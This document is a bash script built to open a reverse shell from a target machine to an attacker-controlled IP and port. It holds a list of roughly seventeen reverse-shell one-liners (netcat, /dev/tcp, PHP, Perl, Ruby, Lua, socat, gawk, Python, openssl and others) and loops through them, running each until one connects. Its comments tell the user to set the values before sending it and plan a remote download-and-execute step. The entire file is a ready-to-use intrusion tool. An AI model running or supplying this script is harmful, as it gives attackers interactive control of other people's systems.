#!/bin/bash
# PUT VALUES HERE BEFOR SEND!
ip=LIP
port=53
declare -a shell_arr=(
  "rm /var/tmp/.f ; mkfifo /var/tmp/.f && cat /var/tmp/.f|/bin/sh -i 2>&1|nc $ip $port >/var/tmp/.f"
  "rm -f /tmp/p; mknod /tmp/p p && telnet $ip $port 0/tmp/p"
  "/bin/sh -i >& /dev/tcp/$ip/$port 0>&1"
  "/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
  "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh <&3 >&3 2>&3\");'"
  "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
  "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
  "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$ip','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
  "ncat $ip $port -e /bin/sh"
  "nc -e /bin/sh $ip $port"
  "nc -c /bin/sh $ip $port"
  "socat TCP:$ip:$port EXEC:/bin/sh"
  "gawk 'BEGIN {P=$port;S=\"> \";H=\"$ip\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'"
  "python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
  "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"
  "rcat $ip $port -r /bin/sh"
  "mkfifo /var/tmp/.s; /bin/sh -i < /var/tmp/.s 2>&1 | openssl s_client -quiet -connect $ip:443 > /var/tmp/.s; rm /var/tmp/.s" #TODO: needs listener with cert! *1
  #"/root/fileserver/lin/print_1.sh"
  #TODO: add ping and DNS resolve to test connectivity?
  # TODO: curl from lip web && execute 
  #TODO: alises, env variables, screen/term settings and etc
)

i=0
/bin/sh -c "${shell_arr[0]}"
while [[ $? -ne 0 ]] ; do # if last commnd failed - continue try
  echo "${shell_arr[$i]}   -- failed"
  i=$(($i+1))
  /bin/sh -c "${shell_arr[$i]}"
done 
echo 'complete'

#*1 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port 443
